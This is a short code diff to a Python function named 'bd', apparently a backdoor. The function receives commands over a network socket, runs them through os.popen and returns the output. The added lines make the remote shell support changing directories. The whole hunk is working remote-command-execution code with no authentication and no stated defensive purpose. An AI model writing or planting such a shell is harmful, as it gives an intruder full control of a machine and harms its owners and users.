@@ -57,6 +57,13 @@ def bd(ip="127.0.0.1",port=5000):
 		while True:
 			try:
 				cmd = conn.recv(1024).decode()
+				if cmd[:2] == "cd":
+					try:
+						os.chdir(cmd[3:])
+					except Exception as e:
+						conn.send(str(e).encode())
+					else:
+						conn.send(str(os.getcwd()).encode())
 				out = os.popen(cmd).read()
 				conn.send(out.encode())
 			except:
